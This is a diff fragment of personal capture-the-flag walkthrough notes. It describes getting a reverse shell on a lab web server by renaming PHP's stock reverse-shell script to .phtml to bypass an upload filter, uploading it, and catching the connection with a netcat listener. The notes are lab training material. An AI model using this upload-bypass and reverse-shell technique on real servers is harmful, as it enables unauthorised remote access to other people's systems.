@@ -21,6 +21,8 @@ dirsearch:
 ## Reverse Shell
 - In terminal navigate to ``` /usr/share/webshells/php/php-reverse-shell.php ```
 - ``` cp php-reverse-shell.php ~/Documents/php_reverse_shell.phtml ``` (copy executable file to "Docuemnts" directory and change the file name to .phtml file).
+
+
 *The reason behind changing the file name to .phtml it's because we need to use a different php extension in order to execute the php reverse shell.
 - Upload the executable file in the website and then go to http://10.10.88.7/uploads.
 - In the terminal start netcat listener - ``` nc -nlvp 4444 ``` > go back to the website and open the executable file > acheived reverese shell.
